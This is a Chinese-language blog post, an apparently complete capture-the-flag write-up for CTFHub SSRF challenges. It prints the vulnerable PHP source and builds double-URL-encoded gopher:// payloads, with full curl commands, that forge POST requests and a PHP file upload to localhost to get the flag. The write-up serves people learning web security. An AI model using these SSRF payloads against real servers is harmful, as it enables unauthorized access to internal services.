@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="001读取源码使用file协议读取源码&#x2F;今天大佬告诉我file协议并不是伪协议，只有php:&#x2F;&#x2F;才是伪协议，都被以前的文章骗了，，，下面是大佬的话file不是伪协议。file就是个协议php:&#x2F;&#x2F;这个并不是一个标准协议。只是php会认这个，所以叫做伪协议比如微信用的wechat:&#x2F;&#x2F;xxxxxxx 只有微信认识，其他的都不认识，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfhub ssrf-POST请求及上传文件">
+<meta property="og:url" content="https://ta3shi.github.io/2020/12/25/ssrf-post/index.html">
+<meta property="og:site_name" content="ta3shi 个人学习自用">
+<meta property="og:description" content="001读取源码使用file协议读取源码&#x2F;今天大佬告诉我file协议并不是伪协议，只有php:&#x2F;&#x2F;才是伪协议，都被以前的文章骗了，，，下面是大佬的话file不是伪协议。file就是个协议php:&#x2F;&#x2F;这个并不是一个标准协议。只是php会认这个，所以叫做伪协议比如微信用的wechat:&#x2F;&#x2F;xxxxxxx 只有微信认识，其他的都不认识，">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-12-24T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-05-13T13:27:38.769Z">
+<meta property="article:author" content="ta3shi">
+<meta property="article:tag" content="ctfweb">
+<meta property="article:tag" content="upload">
+<meta property="article:tag" content="csrf">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ctfhub ssrf-POST请求及上传文件</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2020/12/29/Cybelpunk/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2020/12/21/MRCTF2020%E5%A5%97%E5%A8%83/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ta3shi.github.io/2020/12/25/ssrf-post/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ta3shi.github.io/2020/12/25/ssrf-post/&text=ctfhub ssrf-POST请求及上传文件"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ta3shi.github.io/2020/12/25/ssrf-post/&title=ctfhub ssrf-POST请求及上传文件"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ta3shi.github.io/2020/12/25/ssrf-post/&is_video=false&description=ctfhub ssrf-POST请求及上传文件"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfhub ssrf-POST请求及上传文件&body=Check out this article: https://ta3shi.github.io/2020/12/25/ssrf-post/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ta3shi.github.io/2020/12/25/ssrf-post/&title=ctfhub ssrf-POST请求及上传文件"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ta3shi.github.io/2020/12/25/ssrf-post/&title=ctfhub ssrf-POST请求及上传文件"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ta3shi.github.io/2020/12/25/ssrf-post/&title=ctfhub ssrf-POST请求及上传文件"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ta3shi.github.io/2020/12/25/ssrf-post/&title=ctfhub ssrf-POST请求及上传文件"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ta3shi.github.io/2020/12/25/ssrf-post/&name=ctfhub ssrf-POST请求及上传文件&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ta3shi.github.io/2020/12/25/ssrf-post/&t=ctfhub ssrf-POST请求及上传文件"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#001%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">001读取源码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#010%E6%9E%84%E9%80%A0gopher"><span class="toc-number">2.</span> <span class="toc-text">010构造gopher</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#00%E8%8E%B7%E5%8F%96key%E5%80%BC"><span class="toc-number">2.1.</span> <span class="toc-text">00获取key值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#01gopher-%E6%9E%84%E9%80%A0"><span class="toc-number">2.2.</span> <span class="toc-text">01gopher 构造</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#011-%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">011 上传文件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#00-%E6%9E%84%E9%80%A0gopher"><span class="toc-number">3.1.</span> <span class="toc-text">00 构造gopher</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ctfhub ssrf-POST请求及上传文件
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ta3shi</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-12-24T16:00:00.000Z" class="dt-published" itemprop="datePublished">2020-12-25</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/ctf%E7%BB%83%E4%B9%A0/">ctf练习</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/csrf/" rel="tag">csrf</a>, <a class="p-category" href="/tags/ctfweb/" rel="tag">ctfweb</a>, <a class="p-category" href="/tags/upload/" rel="tag">upload</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="001读取源码"><a href="#001读取源码" class="headerlink" title="001读取源码"></a>001读取源码</h1><p>使用file协议读取源码&#x2F;<em>今天大佬告诉我file协议并不是伪协议，只有php:&#x2F;&#x2F;才是伪协议，都被以前的文章骗了，，，下面是大佬的话<br>file不是伪协议。file就是个协议<br>php:&#x2F;&#x2F;这个并不是一个标准协议。只是php会认这个，所以叫做伪协议<br>比如微信用的wechat:&#x2F;&#x2F;xxxxxxx 只有微信认识，其他的都不认识，所以它也是伪协议。</em>&#x2F;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">flag.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;CTFHUB&quot;</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>] == <span class="variable">$key</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Help: here is 302.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?url=_&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure>
+<h1 id="010构造gopher"><a href="#010构造gopher" class="headerlink" title="010构造gopher"></a>010构造gopher</h1><p>审计flag.php可知，从127.0.0.1访问它可以得到key，从127.0.0.1POST一个key与之相等就可以得到flag值<br>攻击思路，使用gopherPOSTkey到flag<br>?url&#x3D;gopher:&#x2F;&#x2F;</p>
+<h2 id="00获取key值"><a href="#00获取key值" class="headerlink" title="00获取key值"></a>00获取key值</h2><p>payload：<code>?url=http://127.0.0.1/flag.php</code>源码得到key值</p>
+<h2 id="01gopher-构造"><a href="#01gopher-构造" class="headerlink" title="01gopher 构造"></a>01gopher 构造</h2><p>以下的值都必不可少</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1/_POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 36 </span><br><span class="line">Contetn-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">key=c1fea3ab0a81b2eb1a4240f8dd40c20a</span><br></pre></td></tr></table></figure>
+<p>经过两次url编码之后得到gopher链，其中要注意编码时特殊符号不可编码，换行自动编码时%0A，要改成%0D%0A再进行第二次编码，建议使用<a target="_blank" rel="noopener" href="http://www.bejson.com/enc/urlencode/">urlencode</a><br><code>gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AContent-Length:%252036%250D%250AContent-Type:%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey\=c1fea3ab0a81b2eb1a4240f8dd40c20a</code><br>payload：<br><code>curl http://challenge-f93f90e03e49052e.sandbox.ctfhub.com:10080/\?url\=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AContent-Length:%252036%250D%250AContent-Type:%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey\=c1fea3ab0a81b2eb1a4240f8dd40c20a</code><br>稍等片刻得到flag</p>
+<h1 id="011-上传文件"><a href="#011-上传文件" class="headerlink" title="011 上传文件"></a>011 上传文件</h1><p>本题和上一题差不多<br>flag.php文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;CTFHUB&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="00-构造gopher"><a href="#00-构造gopher" class="headerlink" title="00 构造gopher"></a>00 构造gopher</h2><p>通过对上传文件抓包得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Length: 333</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.139.1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytLtDfbm6HxuxgvVx</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,am;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarytLtDfbm6HxuxgvVx</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">------WebKitFormBoundarytLtDfbm6HxuxgvVx</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;123.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">------WebKitFormBoundarytLtDfbm6HxuxgvVx--</span><br></pre></td></tr></table></figure>
+<p>加上gopher后payload为<br><code>gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AContent-Length:%2520333%250D%250ACache-Control:%2520max-age=0%250D%250AUpgrade-Insecure-Requests:%25201%250D%250AOrigin:%2520http://192.168.139.1%250D%250AContent-Type:%2520multipart/form-data;%2520boundary=----WebKitFormBoundarytLtDfbm6HxuxgvVx%250D%250AUser-Agent:%2520Mozilla/5.0%2520(Windows%2520NT%252010.0;%2520Win64;%2520x64)%2520AppleWebKit/537.36%2520(KHTML,%2520like%2520Gecko)%2520Chrome/85.0.4183.102%2520Safari/537.36%250D%250AAccept:%2520text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9%250D%250AAccept-Encoding:%2520gzip,%2520deflate%250D%250AAccept-Language:%2520zh-CN,zh;q=0.9,en;q=0.8,am;q=0.7%250D%250AConnection:%2520close%250D%250A%250D%250A------WebKitFormBoundarytLtDfbm6HxuxgvVx%250D%250AContent-Disposition:%2520form-data;%2520name=%2522PHP_SESSION_UPLOAD_PROGRESS%2522%250D%250A%250D%250A123%250D%250A------WebKitFormBoundarytLtDfbm6HxuxgvVx%250D%250AContent-Disposition:%2520form-data;%2520name=%2522file%2522;%2520filename=%2522123.php%2522%250D%250AContent-Type:%2520application/octet-stream%250D%250A%250D%250A%253C?php%2520phpinfo();?%253E%250D%250A------WebKitFormBoundarytLtDfbm6HxuxgvVx--</code><br>最终payload<br><code>curl -v &#39;http://challenge-c83f10554f86ad9a.sandbox.ctfhub.com:10080/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AContent-Length:%2520333%250D%250ACache-Control:%2520max-age=0%250D%250AUpgrade-Insecure-Requests:%25201%250D%250AOrigin:%2520http://192.168.139.1%250D%250AContent-Type:%2520multipart/form-data;%2520boundary=----WebKitFormBoundarytLtDfbm6HxuxgvVx%250D%250AUser-Agent:%2520Mozilla/5.0%2520(Windows%2520NT%252010.0;%2520Win64;%2520x64)%2520AppleWebKit/537.36%2520(KHTML,%2520like%2520Gecko)%2520Chrome/85.0.4183.102%2520Safari/537.36%250D%250AAccept:%2520text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9%250D%250AAccept-Encoding:%2520gzip,%2520deflate%250D%250AAccept-Language:%2520zh-CN,zh;q=0.9,en;q=0.8,am;q=0.7%250D%250AConnection:%2520close%250D%250A%250D%250A------WebKitFormBoundarytLtDfbm6HxuxgvVx%250D%250AContent-Disposition:%2520form-data;%2520name=%2522PHP_SESSION_UPLOAD_PROGRESS%2522%250D%250A%250D%250A123%250D%250A------WebKitFormBoundarytLtDfbm6HxuxgvVx%250D%250AContent-Disposition:%2520form-data;%2520name=%2522file%2522;%2520filename=%2522123.php%2522%250D%250AContent-Type:%2520application/octet-stream%250D%250A%250D%250A%253C?php%2520phpinfo();?%253E%250D%250A------WebKitFormBoundarytLtDfbm6HxuxgvVx--&#39;</code></p>
+<p>整篇文章参考了<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33295410/article/details/108619685">M1r4n师傅的博客</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#001%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">001读取源码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#010%E6%9E%84%E9%80%A0gopher"><span class="toc-number">2.</span> <span class="toc-text">010构造gopher</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#00%E8%8E%B7%E5%8F%96key%E5%80%BC"><span class="toc-number">2.1.</span> <span class="toc-text">00获取key值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#01gopher-%E6%9E%84%E9%80%A0"><span class="toc-number">2.2.</span> <span class="toc-text">01gopher 构造</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#011-%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">011 上传文件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#00-%E6%9E%84%E9%80%A0gopher"><span class="toc-number">3.1.</span> <span class="toc-text">00 构造gopher</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ta3shi.github.io/2020/12/25/ssrf-post/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ta3shi.github.io/2020/12/25/ssrf-post/&text=ctfhub ssrf-POST请求及上传文件"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ta3shi.github.io/2020/12/25/ssrf-post/&title=ctfhub ssrf-POST请求及上传文件"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ta3shi.github.io/2020/12/25/ssrf-post/&is_video=false&description=ctfhub ssrf-POST请求及上传文件"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfhub ssrf-POST请求及上传文件&body=Check out this article: https://ta3shi.github.io/2020/12/25/ssrf-post/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ta3shi.github.io/2020/12/25/ssrf-post/&title=ctfhub ssrf-POST请求及上传文件"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ta3shi.github.io/2020/12/25/ssrf-post/&title=ctfhub ssrf-POST请求及上传文件"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ta3shi.github.io/2020/12/25/ssrf-post/&title=ctfhub ssrf-POST请求及上传文件"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ta3shi.github.io/2020/12/25/ssrf-post/&title=ctfhub ssrf-POST请求及上传文件"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ta3shi.github.io/2020/12/25/ssrf-post/&name=ctfhub ssrf-POST请求及上传文件&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ta3shi.github.io/2020/12/25/ssrf-post/&t=ctfhub ssrf-POST请求及上传文件"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    ta3shi
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">Home</a></li><!--
+    --><!--
+      --><li><a href="/about/">About</a></li><!--
+    --><!--
+      --><li><a href="/tags/">Tags</a></li><!--
+    --><!--
+      --><li><a href="/categories/">Categories</a></li><!--
+    --><!--
+      --><li><a href="/search/">Search</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  
+</footer>
+
+
+
+    </div>
+    <!-- styles -->
+
+
+
